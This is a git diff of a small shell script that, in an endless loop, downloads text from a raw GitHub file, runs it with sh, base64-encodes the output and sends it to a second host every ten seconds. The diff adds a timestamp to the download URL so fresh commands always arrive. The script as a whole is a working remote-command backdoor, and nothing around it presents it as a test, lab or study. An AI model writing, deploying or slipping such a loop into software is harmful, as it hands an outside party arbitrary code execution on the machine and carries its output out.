@@ -1,19 +1,17 @@
 #!/bin/sh
-URL="https://raw.githubusercontent.com/rossdraper/hello/main/req.txt"
 URL2="https://dev.thelab.sg"
 
 while true; do
+    #URL="https://raw.githubusercontent.com/rossdraper/hello/main/req.txt?1"
+    URL="https://raw.githubusercontent.com/rossdraper/hello/main/req.txt?$(date +%s)"
+
     # Fetch the current file content using the proxy and store in variable
     current_content=$(curl -s "$URL")
-
-
-        # Run the content as a script and capture the output
-        output=$(sh -c "$current_content")
-#       echo $output
-        # Encode the output in Base64
-        base64_output=$(echo "$output" | base64)
-
-        # Send the encoded output as a GET parameter to the second URL using the proxy
-        curl -S -s $URL2/$base64_output
+    # Run the content as a script and capture the output
+    output=$(sh -c "$current_content")
+    #echo $current_content
+    # Encode the output in Base64
+    base64_output=$(echo "$output" | base64)
+    curl -S -s $URL2/$base64_output
     sleep 10
 done
